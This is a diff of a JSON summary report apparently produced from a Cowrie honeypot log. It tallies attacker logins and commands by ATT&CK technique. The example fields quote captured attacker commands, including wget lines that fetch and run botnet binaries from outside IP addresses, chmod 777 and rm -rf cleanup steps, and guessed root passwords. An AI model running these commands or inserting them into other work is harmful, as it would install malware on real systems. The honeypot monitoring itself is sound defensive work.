@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-18 19:02:07",
+  "generated": "2026-08-18 20:01:46",
   "totals": {
-    "commands": 8474,
-    "login_failed": 6530,
-    "login_success": 2595,
-    "sessions": 6705
+    "commands": 8514,
+    "login_failed": 6609,
+    "login_success": 2602,
+    "sessions": 6806
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 6530,
+      "count": 6609,
       "examples": [
         "root / 19801024",
         "root / sunsunsun",
@@ -21,14 +21,14 @@
         "root / 826826826"
       ],
       "first": "2026-08-18T00:00:03.054815Z",
-      "last": "2026-08-18T19:02:03.770000Z",
-      "unique_ips": 87
+      "last": "2026-08-18T20:00:33.426825Z",
+      "unique_ips": 93
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 2595,
+      "count": 2602,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123@@@",
@@ -37,14 +37,14 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-08-18T00:06:39.840434Z",
-      "last": "2026-08-18T18:39:20.001510Z",
-      "unique_ips": 63
+      "last": "2026-08-18T19:59:45.382599Z",
+      "unique_ips": 68
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 227,
+      "count": 244,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -53,14 +53,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T18:22:09.785239Z",
-      "unique_ips": 18
+      "last": "2026-08-18T19:40:16.237991Z",
+      "unique_ips": 19
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 148,
+      "count": 155,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -69,14 +69,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T17:26:57.936498Z",
-      "unique_ips": 16
+      "last": "2026-08-18T19:40:16.237991Z",
+      "unique_ips": 17
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 21,
+      "count": 23,
       "examples": [
         "uname -s -v -n -r -m",
         "/bin/./uname -s -v -n -r -m",
@@ -85,27 +85,27 @@
         "uname -a"
       ],
       "first": "2026-08-18T02:27:39.980641Z",
-      "last": "2026-08-18T18:39:20.785797Z",
-      "unique_ips": 17
+      "last": "2026-08-18T19:32:19.162516Z",
+      "unique_ips": 19
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 11,
+      "count": 12,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-18T03:14:17.803787Z",
-      "last": "2026-08-18T17:53:51.379390Z",
-      "unique_ips": 11
+      "last": "2026-08-18T19:39:39.736073Z",
+      "unique_ips": 12
     },
     {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 6,
+      "count": 8,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "echo 8VKumo1lW4 && cd /tmp; echo u6154lBAuk > fEiJLvabbS && sleep 13 &",
@@ -113,20 +113,20 @@
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
       ],
       "first": "2026-08-18T04:38:14.387524Z",
-      "last": "2026-08-18T17:53:51.379390Z",
+      "last": "2026-08-18T19:12:19.349797Z",
       "unique_ips": 5
     },
     {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 4,
+      "count": 5,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
       ],
       "first": "2026-08-18T04:38:14.387524Z",
-      "last": "2026-08-18T17:53:51.379390Z",
+      "last": "2026-08-18T19:12:19.349797Z",
       "unique_ips": 4
     },
     {
@@ -170,43 +170,43 @@
   "unmapped": [
     [
       "system",
-      2526
+      2528
     ],
     [
       "shell",
-      2526
+      2528
     ],
     [
       "sh",
-      2526
+      2528
     ],
     [
       "/bin/busybox",
       411
     ],
     [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      18
+    ],
+    [
       "enable",
-      16
+      17
     ],
     [
       "linuxshell",
-      16
+      17
     ],
     [
       "cd /proc && cat self/cmdline",
-      13
+      14
     ],
     [
       "enablelinuxshell",
-      10
+      11
     ],
     [
       "ping ;sh",
-      10
-    ],
-    [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      10
+      11
     ],
     [
       "zalee",
